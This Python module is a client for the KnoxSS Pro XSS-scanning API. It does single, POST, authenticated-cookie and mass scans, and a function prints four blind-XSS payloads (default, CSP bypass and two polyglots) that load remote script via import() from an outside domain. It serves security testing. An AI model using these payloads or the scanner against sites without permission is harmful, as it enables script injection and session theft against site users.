#!/usr/bin/env python3
"""
KnoxSS Pro API Integration for XSS Vibes
Based on official API examples from knoxinfo documentation.

Supports all KnoxSS Pro features:
- GET/POST scanning
- Authentication (cookies)
- AFB (Anti-Filter Bypass) mode
- Flash mode with [XSS] marker
- CheckPoC validation
- PoC feedback
- Mass testing
"""

import json
import asyncio
import aiohttp
import base64
from pathlib import Path
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from urllib.parse import quote, unquote


@dataclass
class KnoxSSResult:
    """KnoxSS API scan result."""

    xss_found: bool
    poc: Optional[str]
    target: str
    post_data: Optional[str]
    redir: str
    error: Optional[str]
    api_call: str
    time_elapsed: str
    timestamp: str
    version: str

    @classmethod
    def from_api_response(cls, data: Dict) -> "KnoxSSResult":
        """Create result from API response."""
        return cls(
            xss_found=data.get("XSS", "false").lower() == "true",
            poc=data.get("PoC"),
            target=data.get("Target", ""),
            post_data=data.get("POST Data"),
            redir=data.get("Redir", "none"),
            error=data.get("Error"),
            api_call=data.get("API Call", "0/0"),
            time_elapsed=data.get("Time Elapsed", "0s"),
            timestamp=data.get("Timestamp", ""),
            version=data.get("Version", ""),
        )


class KnoxSSConfig:
    """KnoxSS configuration handler."""

    def __init__(self, config_path: Optional[str] = None):
        self.config_path = config_path or "knoxss_config.json"
        self.config = self._load_config()

    def _load_config(self) -> Dict:
        """Load KnoxSS configuration."""
        config_file = Path(self.config_path)

        if not config_file.exists():
            return {}

        with open(config_file, "r") as f:
            return json.load(f)

    def get_api_key(self) -> Optional[str]:
        """Get configured API key."""
        return self.config.get("knoxss", {}).get("api_key")

    def get_personalized_payloads(self) -> List[str]:
        """Generate personalized blind XSS payloads using config data."""
        knoxss_config = self.config.get("knoxss", {})

        if not knoxss_config.get("enabled"):
            return []

        domain = knoxss_config.get("domain", "x55.is")
        user_id = knoxss_config.get("user_id", "17889")

        payloads = [
            # Default vector with your domain and ID
            f"1'\"<B/--><Img Src=//{domain}?1={user_id} OnError=import(src)>",
            # CSP Bypass vector
            f"1'\"</Script><Base id={user_id} Href=//{domain}>",
            # Short Polyglot for HTML & JS contexts
            f"1'/*\\'/*\"/*\\\"/*</Script/--><Input/AutoFocus/OnFocus=/**/(import(/https:\\\\{domain}?1={user_id}/.source))//>",
            # Full Polyglot (20+ XSS cases) - RECOMMENDED
            f"JavaScript://%250A/*?'/*\\'/*\"/*\\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${{/*/;{{/**/(import(/https:\\\\{domain}?1={user_id}/.source))}}//\\76-->",
        ]

        return payloads

    def is_configured(self) -> bool:
        """Check if KnoxSS is properly configured."""
        knoxss_config = self.config.get("knoxss", {})
        return bool(knoxss_config.get("api_key"))


class KnoxSSClient:
    """
    KnoxSS Pro API Client implementing all official API features.
    Based on examples from knoxinfo documentation.
    """

    def __init__(self, config: KnoxSSConfig):
        self.config = config
        self.session = None
        self.api_url = "https://api.knoxss.pro"

    async def __aenter__(self):
        """Async context manager entry."""
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """Async context manager exit."""
        if self.session:
            await self.session.close()

    def _encode_url_params(self, url: str) -> str:
        """Encode & characters in URL parameters as %26 for CLI compatibility."""
        if "?" in url:
            base, params = url.split("?", 1)
            # Encode & as %26 in parameters
            encoded_params = params.replace("&", "%26")
            return f"{base}?{encoded_params}"
        return url

    async def scan_get_method(self, target: str, **kwargs) -> KnoxSSResult:
        """
        GET Method scanning.
        Example: https://x55.is/brutelogic/xss.php?a=any
        """
        api_key = self.config.get_api_key()
        if not api_key:
            raise ValueError("KnoxSS API key not configured")

        # Encode URL parameters
        encoded_target = self._encode_url_params(target)

        data = {"target": encoded_target}

        # Add optional parameters
        if kwargs.get("afb"):
            data["afb"] = "1"
        if kwargs.get("checkpoc"):
            data["checkpoc"] = "1"
        if kwargs.get("poc"):
            data["poc"] = kwargs["poc"]

        headers = {
            "X-API-KEY": api_key,
            "Content-Type": "application/x-www-form-urlencoded",
        }

        async with self.session.post(
            self.api_url, data=data, headers=headers
        ) as response:
            if response.status != 200:
                raise RuntimeError(f"KnoxSS API error: {response.status}")

            result_data = await response.json()
            return KnoxSSResult.from_api_response(result_data)

    async def scan_post_method(
        self, target: str, post_data: str, **kwargs
    ) -> KnoxSSResult:
        """
        POST Method scanning.
        Example: target=https://x55.is/brutelogic/xss.php&post=a=any
        """
        api_key = self.config.get_api_key()
        if not api_key:
            raise ValueError("KnoxSS API key not configured")

        # Encode & characters in POST data
        encoded_post_data = post_data.replace("&", "%26")

        data = {"target": target, "post": encoded_post_data}

        # Add optional parameters
        if kwargs.get("afb"):
            data["afb"] = "1"
        if kwargs.get("auth"):
            data["auth"] = kwargs["auth"]

        headers = {
            "X-API-KEY": api_key,
            "Content-Type": "application/x-www-form-urlencoded",
        }

        async with self.session.post(
            self.api_url, data=data, headers=headers
        ) as response:
            if response.status != 200:
                raise RuntimeError(f"KnoxSS API error: {response.status}")

            result_data = await response.json()
            return KnoxSSResult.from_api_response(result_data)

    async def scan_authenticated(
        self, target: str, auth_header: str, **kwargs
    ) -> KnoxSSResult:
        """
        Authenticated scanning with cookies or headers.
        Example: auth=Cookie:PHPSESSID=9p77u90dssmkmn3kgmmgq3b5d3
        """
        encoded_target = self._encode_url_params(target)

        data = {"target": encoded_target, "auth": auth_header}

        return await self._make_request(data, **kwargs)

    async def scan_flash_mode(self, target: str, **kwargs) -> KnoxSSResult:
        """
        Flash Mode with [XSS] marker for super fast testing.
        Example: https://x55.is/brutelogic/xss.php?a=[XSS]
        """
        if "[XSS]" not in target:
            raise ValueError("Flash mode requires [XSS] marker in target URL")

        return await self.scan_get_method(target, **kwargs)

    async def validate_poc(self, target: str, poc_url: str) -> KnoxSSResult:
        """
        CheckPoC feature to validate a working PoC.
        Example: checkpoc=1 with working XSS payload
        """
        return await self.scan_get_method(target, checkpoc=True, poc=poc_url)

    async def submit_poc_feedback(self, target: str, poc_url: str) -> KnoxSSResult:
        """
        PoC Feedback feature to help improve KnoxSS.
        Submit working PoC for GET requests.
        """
        return await self.scan_get_method(target, poc=poc_url)

    async def _make_request(self, data: Dict, **kwargs) -> KnoxSSResult:
        """Internal method to make API requests."""
        api_key = self.config.get_api_key()
        if not api_key:
            raise ValueError("KnoxSS API key not configured")

        # Add optional parameters
        if kwargs.get("afb"):
            data["afb"] = "1"
        if kwargs.get("checkpoc"):
            data["checkpoc"] = "1"
        if kwargs.get("poc"):
            data["poc"] = kwargs["poc"]

        headers = {
            "X-API-KEY": api_key,
            "Content-Type": "application/x-www-form-urlencoded",
        }

        async with self.session.post(
            self.api_url, data=data, headers=headers
        ) as response:
            if response.status != 200:
                raise RuntimeError(f"KnoxSS API error: {response.status}")

            result_data = await response.json()
            return KnoxSSResult.from_api_response(result_data)


# CLI Functions
def knoxss_config_status():
    """Show KnoxSS configuration status."""
    config = KnoxSSConfig()

    print("🔐 KnoxSS Pro Configuration")
    print("=" * 40)

    if not config.config:
        print("❌ No configuration file found")
        print("💡 Create knoxss_config.json with your API credentials")
        return

    knoxss_config = config.config.get("knoxss", {})
    api_key = knoxss_config.get("api_key", "")

    print(f"API Key: {'✅ Set (...{api_key[-8:]}' if api_key else '❌ Missing'}")
    print(f"API URL: {knoxss_config.get('api_url', 'https://api.knoxss.pro')}")
    print(f"Domain: {knoxss_config.get('domain', '❌ Not set')}")
    print(f"User ID: {knoxss_config.get('user_id', '❌ Not set')}")
    print(f"Enabled: {'✅ Yes' if knoxss_config.get('enabled') else '❌ No'}")

    if config.is_configured():
        print("\n✅ KnoxSS is properly configured")
        print("\n📋 Supported scan modes:")
        print("  • GET method scanning")
        print("  • POST method scanning")
        print("  • Authenticated scanning (cookies)")
        print("  • AFB (Anti-Filter Bypass) mode")
        print("  • Flash mode with [XSS] marker")
        print("  • CheckPoC validation")
        print("  • PoC feedback submission")
    else:
        print("\n❌ KnoxSS configuration incomplete")


def generate_personalized_payloads():
    """Generate and display personalized KnoxSS payloads."""
    config = KnoxSSConfig()

    if not config.is_configured():
        print("❌ KnoxSS not configured. Add API key to knoxss_config.json")
        return

    payloads = config.get_personalized_payloads()

    print("🧬 Personalized KnoxSS Blind XSS Payloads")
    print("=" * 50)

    payload_names = [
        "Default Vector (simple, good for regular cases)",
        "CSP Bypass (alternative for basic filter and CSP bypasses)",
        "Short Polyglot (balanced, HTML & JS main cases)",
        "Full Polyglot (best, 20+ XSS cases - RECOMMENDED)",
    ]

    for i, (name, payload) in enumerate(zip(payload_names, payloads), 1):
        print(f"\n{i}. {name}")
        print(f"   {payload}")

    knoxss_config = config.config.get("knoxss", {})
    svg_endpoint = knoxss_config.get("svg_endpoint")
    if svg_endpoint:
        print(f"\n5. Image Upload Vector")
        print(f"   SVG Upload URL: {svg_endpoint}")

    print(f"\n✅ Generated {len(payloads)} personalized payloads")
    print("💡 These payloads use your personal KnoxSS domain and ID")


async def knoxss_scan_target(target: str, **kwargs):
    """Scan target URL with KnoxSS Pro API."""
    config = KnoxSSConfig()

    if not config.is_configured():
        print("❌ KnoxSS not configured")
        return None

    try:
        async with KnoxSSClient(config) as client:
            print(f"🔍 Scanning with KnoxSS Pro: {target}")

            # Determine scan method based on parameters
            if kwargs.get("post_data"):
                result = await client.scan_post_method(
                    target, kwargs["post_data"], **kwargs
                )
            elif kwargs.get("auth"):
                result = await client.scan_authenticated(
                    target, kwargs["auth"], **kwargs
                )
            elif "[XSS]" in target:
                result = await client.scan_flash_mode(target, **kwargs)
            else:
                result = await client.scan_get_method(target, **kwargs)

            print("\n📊 KnoxSS Pro Results")
            print("=" * 40)
            print(f"Target: {result.target}")
            print(f"XSS Found: {'🚨 YES' if result.xss_found else '✅ Clean'}")

            if result.xss_found and result.poc:
                print(f"🎯 Proof of Concept:")
                print(f"   {result.poc}")

            if result.post_data and result.post_data != "none":
                print(f"POST Data: {result.post_data}")

            print(f"Redirect: {result.redir}")
            print(f"API Calls Used: {result.api_call}")
            print(f"Time Elapsed: {result.time_elapsed}")
            print(f"Scan Time: {result.timestamp}")
            print(f"KnoxSS Version: {result.version}")

            if result.error and result.error != "none":
                print(f"❌ Error: {result.error}")

            return result

    except Exception as e:
        print(f"❌ KnoxSS scan failed: {e}")
        return None


async def knoxss_mass_scan(file_path: str, delay: float = 1.0):
    """Mass scan URLs from file using KnoxSS Pro API."""
    config = KnoxSSConfig()

    if not config.is_configured():
        print("❌ KnoxSS not configured")
        return []

    try:
        with open(file_path, "r") as f:
            targets = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"❌ File not found: {file_path}")
        return []

    results = []
    found_count = 0

    async with KnoxSSClient(config) as client:
        for i, target in enumerate(targets, 1):
            print(f"\n🔍 Scanning {i}/{len(targets)}: {target}")

            try:
                result = await client.scan_get_method(target)
                results.append(result)

                if result.xss_found:
                    found_count += 1
                    print(f"🚨 XSS FOUND! PoC: {result.poc}")
                else:
                    print("✅ Clean")

            except Exception as e:
                print(f"❌ Error: {e}")

            # Rate limiting
            if i < len(targets):
                await asyncio.sleep(delay)

    print(f"\n📊 Mass Scan Summary:")
    print(f"   Total scanned: {len(targets)}")
    print(f"   XSS found: {found_count}")
    print(f"   Clean: {len(targets) - found_count}")

    return results


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("🔥 KnoxSS Pro Integration Commands:")
        print("=" * 40)
        print("  config                    - Show configuration status")
        print("  payloads                  - Generate personalized payloads")
        print("  scan <url>                - Scan single URL (GET method)")
        print("  scan-post <url> <data>    - Scan with POST data")
        print("  scan-auth <url> <auth>    - Scan with authentication")
        print("  scan-flash <url>          - Flash mode (use [XSS] marker)")
        print("  scan-afb <url>            - Scan with AFB enabled")
        print("  validate-poc <url> <poc>  - Validate PoC")
        print("  mass-scan <file>          - Mass scan URLs from file")
        print("\nExamples:")
        print("  python knoxss_integration.py scan 'https://target.com/page.php?id=1'")
        print(
            "  python knoxss_integration.py scan-post 'https://target.com/page.php' 'name=test'"
        )
        print(
            "  python knoxss_integration.py scan-flash 'https://target.com/page.php?q=[XSS]'"
        )
        sys.exit(1)

    command = sys.argv[1]

    if command == "config":
        knoxss_config_status()
    elif command == "payloads":
        generate_personalized_payloads()
    elif command == "scan" and len(sys.argv) >= 3:
        target_url = sys.argv[2]
        asyncio.run(knoxss_scan_target(target_url))
    elif command == "scan-post" and len(sys.argv) >= 4:
        target_url = sys.argv[2]
        post_data = sys.argv[3]
        asyncio.run(knoxss_scan_target(target_url, post_data=post_data))
    elif command == "scan-auth" and len(sys.argv) >= 4:
        target_url = sys.argv[2]
        auth_header = sys.argv[3]
        asyncio.run(knoxss_scan_target(target_url, auth=auth_header))
    elif command == "scan-flash" and len(sys.argv) >= 3:
        target_url = sys.argv[2]
        asyncio.run(knoxss_scan_target(target_url))
    elif command == "scan-afb" and len(sys.argv) >= 3:
        target_url = sys.argv[2]
        asyncio.run(knoxss_scan_target(target_url, afb=True))
    elif command == "validate-poc" and len(sys.argv) >= 4:
        target_url = sys.argv[2]
        poc_url = sys.argv[3]
        asyncio.run(knoxss_scan_target(target_url, checkpoc=True, poc=poc_url))
    elif command == "mass-scan" and len(sys.argv) >= 3:
        file_path = sys.argv[2]
        asyncio.run(knoxss_mass_scan(file_path))
    else:
        print("❌ Invalid command or missing arguments")
        print("Use 'python knoxss_integration.py' for help")
